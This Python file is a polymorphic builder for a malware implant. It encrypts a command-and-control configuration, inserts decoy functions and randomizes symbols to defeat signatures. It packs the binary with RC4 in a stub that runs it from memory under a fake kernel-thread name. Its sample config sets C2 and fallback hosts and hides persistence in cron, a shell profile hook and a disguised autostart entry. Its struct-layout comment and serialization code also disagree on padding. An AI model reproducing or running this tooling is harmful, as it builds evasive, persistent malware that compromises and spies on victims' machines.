#!/usr/bin/env python3
"""
morph.py — Polymorphic Mutation Engine for PHANTOM Framework
Generates a cryptographically unique agent binary for each deployment.
"""

import os, sys, re, json, random, string, struct, hashlib, subprocess, tempfile, shutil, binascii
from pathlib import Path

PHANTOM_SRC  = Path("phantom.c")
CC           = os.environ.get("CC", "musl-gcc")
STRIP        = "strip"
OPT_LEVELS   = ["-O1", "-O2", "-O3", "-Os"]

# ── Realistic function names for dead code insertion ──
PLAUSIBLE_NAMES = [
    "validate_session_token", "refresh_dbus_connection", "parse_locale_config",
    "update_font_cache_entry", "sync_journal_metadata", "check_polkit_authority",
    "rotate_log_descriptor", "rebuild_mime_database", "verify_xdg_basedir",
    "enumerate_block_devices", "calibrate_rtc_offset", "flush_nscd_cache",
    "negotiate_gssapi_context", "resolve_avahi_service", "compact_bdb_environment",
    "emit_udev_change_event", "reindex_man_database", "trim_snap_revisions",
    "reconcile_dpkg_status", "defragment_btrfs_extent", "prune_docker_overlay",
    "audit_selinux_context", "rebalance_irq_affinity", "regenerate_initramfs_hook",
]

JUNK_BODIES = [
    """    volatile int acc = 0;
    for (int i = 0; i < (int)(sizeof(void*) << 3); i++)
        acc ^= (i * 0x5DEECE66LL + 0xBLL) >> 16;
    return acc & 0x7FFFFFFF;""",

    """    char scratch[64];
    memset(scratch, 0x41, sizeof(scratch));
    for (size_t i = 0; i < sizeof(scratch); i++)
        scratch[i] = (char)((scratch[i] ^ (i * 7)) & 0x7F);
    return (int)scratch[31];""",

    """    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    unsigned long h = (unsigned long)ts.tv_nsec;
    h = ((h >> 16) ^ h) * 0x45D9F3B;
    h = ((h >> 16) ^ h) * 0x45D9F3B;
    return (int)((h >> 16) ^ h);""",

    """    pid_t p = getpid();
    int fd = open("/dev/urandom", O_RDONLY);
    int val = 0;
    if (fd >= 0) { read(fd, &val, sizeof(val)); close(fd); }
    return val ^ (int)p;""",
]


class MutationEngine:
    def __init__(self, config: dict, cert_der_path: str = None):
        self.config = config
        self.source = PHANTOM_SRC.read_text()
        self.build_key = os.urandom(32)
        self.build_iv  = os.urandom(16)
        self.cert_fp   = b'\x00' * 32
        if cert_der_path:
            if not os.path.exists(cert_der_path):
                raise FileNotFoundError(f"Certificate file not found: {cert_der_path}")
            with open(cert_der_path, 'rb') as f:
                self.cert_fp = hashlib.sha256(f.read()).digest()
        self.symbol_map = {}

    def _aes_ctr_encrypt(self, plaintext: bytes) -> bytes:
        # Use OpenSSL CLI to avoid python dependencies
        key_hex = binascii.hexlify(self.build_key).decode()
        iv_hex  = binascii.hexlify(self.build_iv).decode()

        cmd = [
            'openssl', 'enc', '-aes-256-ctr',
            '-K', key_hex,
            '-iv', iv_hex,
            '-e', '-nopad'
        ]

        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate(input=plaintext)

        if proc.returncode != 0:
            raise RuntimeError(f"OpenSSL encryption failed: {err.decode()}")

        return out

    def _serialize_config(self) -> bytes:
        """Pack config struct matching exact C memory layout with alignment.

        struct phantom_cfg layout (x86_64):
            char     c2_url[256]            @ 0x000   (256)
            char     c2_fallback_dns[128]   @ 0x100   (128)
            char     c2_fallback_paste[256] @ 0x180   (256)
            char     proc_name[16]          @ 0x280   (16)
            char     proc_cmdline[256]      @ 0x290   (256)
            char     cron_entry[512]        @ 0x390   (512)
            char     profile_hook[512]      @ 0x590   (512)
            char     xdg_desktop[1024]      @ 0x790   (1024)
            char     agent_id[65]           @ 0xB90   (65)
            -- 3 bytes padding for uint32_t alignment --
            uint32_t beacon_base_sec        @ 0xBD4   (4)
            float    beacon_jitter          @ 0xBD8   (4)
            uint16_t tunnel_port            @ 0xBDC   (2)
            uint8_t  max_cpu_pct            @ 0xBDE   (1)
            -- 1 byte padding for char[] alignment --
            char     self_path[1024]        @ 0xBE0   (1024)
        """
        c = self.config
        buf  = c['c2_url'].encode().ljust(256, b'\x00')
        buf += c['c2_fallback_dns'].encode().ljust(128, b'\x00')
        buf += c['c2_fallback_paste'].encode().ljust(256, b'\x00')
        buf += c['proc_name'].encode().ljust(16, b'\x00')
        buf += c['proc_cmdline'].encode().ljust(256, b'\x00')
        buf += c['cron_entry'].encode().ljust(512, b'\x00')
        buf += c['profile_hook'].encode().ljust(512, b'\x00')
        buf += c['xdg_desktop'].encode().ljust(1024, b'\x00')
        buf += c['agent_id'].encode().ljust(65, b'\x00')
        buf += b'\x00' * 3   # alignment padding before uint32_t
        buf += struct.pack('<I', c['beacon_base_sec'])
        buf += struct.pack('<f', c['beacon_jitter'])
        buf += struct.pack('<H', c['tunnel_port'])
        buf += struct.pack('<B', c['max_cpu_pct'])
        # buf += b'\x00' * 1   # Removed: char alignment is 1, no padding needed here
        buf += b'\x00' * 1024  # self_path (populated at runtime)
        buf += b'\x00' * 1     # Add padding at the end to match sizeof(struct) alignment
        return buf

    def _bytes_to_c_array(self, data: bytes) -> str:
        lines = []
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            hexvals = ', '.join(f'0x{b:02X}' for b in chunk)
            lines.append(f'    {hexvals}')
        return '{\n' + ',\n'.join(lines) + '\n}'

    def inject_encrypted_config(self):
        """Replace MORPH_* markers with build-unique encrypted values."""
        cfg_plain  = self._serialize_config()
        cfg_cipher = self._aes_ctr_encrypt(cfg_plain)

        self.source = self.source.replace(
            '{ /*MORPH_KEY*/ }', self._bytes_to_c_array(self.build_key))
        self.source = self.source.replace(
            '{ /*MORPH_IV*/ }', self._bytes_to_c_array(self.build_iv))
        self.source = self.source.replace(
            '{ /*MORPH_CFG*/ }', self._bytes_to_c_array(cfg_cipher))
        self.source = self.source.replace(
            '{ /*MORPH_CERT_FP*/ }', self._bytes_to_c_array(self.cert_fp))

    def insert_dead_functions(self, count: int = None):
        """Insert plausible-looking dead functions at random positions."""
        if count is None:
            count = random.randint(5, 12)

        names = random.sample(PLAUSIBLE_NAMES, min(count, len(PLAUSIBLE_NAMES)))
        dead_fns = []

        for name in names:
            body = random.choice(JUNK_BODIES)
            fn = f"""
static int __attribute__((used)) {name}(void) {{
{body}
}}
"""
            dead_fns.append(fn)

        # Find insertion point: after the config struct, before first real function
        marker = 'static struct phantom_cfg G;'
        idx = self.source.find(marker)
        if idx >= 0:
            insert_at = self.source.index('\n', idx) + 1
            random.shuffle(dead_fns)
            self.source = (self.source[:insert_at]
                         + '\n'.join(dead_fns)
                         + self.source[insert_at:])

    def substitute_patterns(self):
        """Replace code patterns with semantically equivalent alternatives.

        Only operates on lines that look like executable C statements —
        skips string literals, comments, and preprocessor directives to
        avoid corrupting non-code content.
        """
        def _safe_sub_line(line, pattern, repl_fn):
            """Apply regex substitution only on code portions of a line."""
            stripped = line.lstrip()
            if stripped.startswith('//') or stripped.startswith('#') or stripped.startswith('*'):
                return line
            # Don't touch lines containing string literals around the match
            if '"' in line:
                return line
            return re.sub(pattern, repl_fn, line, count=1)

        subs = [
            # x != 0 → x  (only bare comparisons, not >=, <=)
            (r'\b(\w+)\s*!=\s*0\b', lambda m: m.group(1)),
            # == 0 → !
            (r'\b(\w+)\s*==\s*0\b', lambda m: f'!{m.group(1)}'),
        ]
        for pattern, repl in subs:
            if random.random() > 0.5:
                lines = self.source.split('\n')
                for idx, line in enumerate(lines):
                    new_line = _safe_sub_line(line, pattern, repl)
                    if new_line != line:
                        lines[idx] = new_line
                        break  # Only one substitution per pattern
                self.source = '\n'.join(lines)

    def rename_internal_symbols(self):
        """Rename all static functions with randomized but plausible names."""
        prefixes = ['_sys_', '_do_', '_handle_', '__x_', '_ipc_', '_fs_']
        suffixes = ['_impl', '_core', '_op', '_exec', '_run', '_task']

        static_fns = re.findall(r'static\s+\w+\s+(?:__attribute__\s*\(\(.*?\)\)\s+)?(\w+)\s*\(', self.source)
        for fn_name in static_fns:
            if fn_name in self.symbol_map:
                continue
            new_name = (random.choice(prefixes)
                       + ''.join(random.choices(string.ascii_lowercase, k=6))
                       + random.choice(suffixes))
            self.symbol_map[fn_name] = new_name
            self.source = re.sub(
                r'\b' + re.escape(fn_name) + r'\b',
                new_name, self.source)

    def compile_and_pack(self, output_path: str):
        """Compile mutated source, strip, and apply RC4 packer."""
        with tempfile.NamedTemporaryFile(suffix='.c', mode='w', delete=False) as tf:
            tf.write(self.source)
            src_path = tf.name

        opt = random.choice(OPT_LEVELS)
        obj_path = src_path.replace('.c', '')

        musl_prefix = os.environ.get("MUSL_PREFIX", "")
        extra_flags = []
        if musl_prefix:
            extra_flags = [f"-I{musl_prefix}/include", f"-L{musl_prefix}/lib"]

        compile_cmd = [
            CC, opt, '-static', '-s', '-fPIE', '-pie',
            '-ffunction-sections', '-fdata-sections',
            '-Wl,--gc-sections',
            '-DNDEBUG', '-DCURL_DISABLE_TYPECHECK',
            '-o', obj_path, src_path,
        ] + extra_flags + [
            '-lcurl', '-lssl', '-lcrypto', '-lpthread'
        ]

        subprocess.check_call(compile_cmd)
        subprocess.check_call([STRIP, '--strip-all', obj_path])
        os.unlink(src_path)

        # ── RC4 Packer ──
        with open(obj_path, 'rb') as f:
            raw_elf = f.read()
        os.unlink(obj_path)

        pack_key = os.urandom(32)
        packed   = self._rc4(raw_elf, pack_key)

        # Build self-extracting stub
        stub_src = self._generate_stub(packed, pack_key)
        with tempfile.NamedTemporaryFile(suffix='.c', mode='w', delete=False) as sf:
            sf.write(stub_src)
            stub_path = sf.name

        stub_obj = stub_path.replace('.c', '')
        subprocess.check_call([
            CC, '-Os', '-static', '-nostartfiles', '-s',
            '-fPIE', '-pie',
            '-o', stub_obj, stub_path,
        ])
        subprocess.check_call([STRIP, '--strip-all', stub_obj])
        os.unlink(stub_path)

        shutil.move(stub_obj, output_path)
        os.chmod(output_path, 0o755)
        print(f"[+] Agent written to {output_path}")
        print(f"    SHA-256: {hashlib.sha256(Path(output_path).read_bytes()).hexdigest()}")
        print(f"    Size:    {os.path.getsize(output_path)} bytes")

    @staticmethod
    def _rc4(data: bytes, key: bytes) -> bytes:
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) & 0xFF
            S[i], S[j] = S[j], S[i]
        i = j = 0
        out = bytearray(len(data))
        for k in range(len(data)):
            i = (i + 1) & 0xFF
            j = (j + S[i]) & 0xFF
            S[i], S[j] = S[j], S[i]
            out[k] = data[k] ^ S[(S[i] + S[j]) & 0xFF]
        return bytes(out)

    def _generate_stub(self, packed_elf: bytes, key: bytes) -> str:
        payload_hex = ', '.join(f'0x{b:02X}' for b in packed_elf)
        key_hex     = ', '.join(f'0x{b:02X}' for b in key)
        return f"""
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>
#include <stddef.h>

static const uint8_t PK[] = {{ {key_hex} }};
static const uint8_t PD[] = {{ {payload_hex} }};
static const size_t PD_LEN = sizeof(PD);

static void xrc4(uint8_t *d, size_t dl, const uint8_t *k, size_t kl) {{
    uint8_t S[256]; uint32_t i, j = 0; uint8_t t;
    for (i = 0; i < 256; i++) S[i] = (uint8_t)i;
    for (i = 0; i < 256; i++) {{
        j = (j + S[i] + k[i % kl]) & 0xFF;
        t = S[i]; S[i] = S[j]; S[j] = t;
    }}
    i = j = 0;
    for (size_t n = 0; n < dl; n++) {{
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        t = S[i]; S[i] = S[j]; S[j] = t;
        d[n] ^= S[(S[i] + S[j]) & 0xFF];
    }}
}}

void _start(void) {{
    uint8_t *buf = (uint8_t *)syscall(SYS_mmap, 0, PD_LEN,
        0x7, 0x22, -1, 0);  /* PROT_RWX, MAP_PRIVATE|MAP_ANON */
    for (size_t i = 0; i < PD_LEN; i++) buf[i] = PD[i];
    xrc4(buf, PD_LEN, PK, sizeof(PK));
    int fd = (int)syscall(0x13F, "", 0u);
    syscall(SYS_write, fd, buf, PD_LEN);
    char *av[] = {{ "[kworker/u8:3]", (char*)0 }};
    char *ev[] = {{ (char*)0 }};
    syscall(0x142, fd, "", av, ev, 0x1000);
    syscall(SYS_exit, 1);
}}
"""

    def generate(self, output_path: str):
        """Full pipeline: encrypt → mutate → compile → pack."""
        self.inject_encrypted_config()
        self.insert_dead_functions()
        self.substitute_patterns()
        self.rename_internal_symbols()
        self.compile_and_pack(output_path)
# ── Usage ──

if __name__ == '__main__':
    agent_config = {
        'c2_url':             'https://cdn-assets-eu.example.com/api/v2/telemetry',
        'c2_fallback_dns':    'update.cdn-telemetry.example.com',
        'c2_fallback_paste':  'https://paste.example.com/raw/aB3xK9mQ',
        'proc_name':          'kworker/3:0',
        'proc_cmdline':       '[kworker/3:0-events_unbound]',
        'cron_entry':         '*/5 * * * * ~/.local/lib/dbus-session-helper >/dev/null 2>&1',
        'profile_hook':       '[ -f ~/.local/lib/dbus-session-helper ] && nohup ~/.local/lib/dbus-session-helper >/dev/null 2>&1 &',
        'xdg_desktop': (
            '[Desktop Entry]\n'
            'Type=Application\n'
            'Name=D-Bus Session Helper\n'
            'Exec=%h/.local/lib/dbus-session-helper\n'
            'Hidden=true\n'
            'NoDisplay=true\n'
            'X-GNOME-Autostart-enabled=true\n'
        ),
        'agent_id':           hashlib.sha256(os.urandom(32)).hexdigest(),
        'beacon_base_sec':    300,
        'beacon_jitter':      0.3,
        'tunnel_port':        19228,
        'max_cpu_pct':        40,
    }

    engine = MutationEngine(agent_config, cert_der_path='c2_cert.der')
    engine.generate(sys.argv[1] if len(sys.argv) > 1 else 'agent_out')
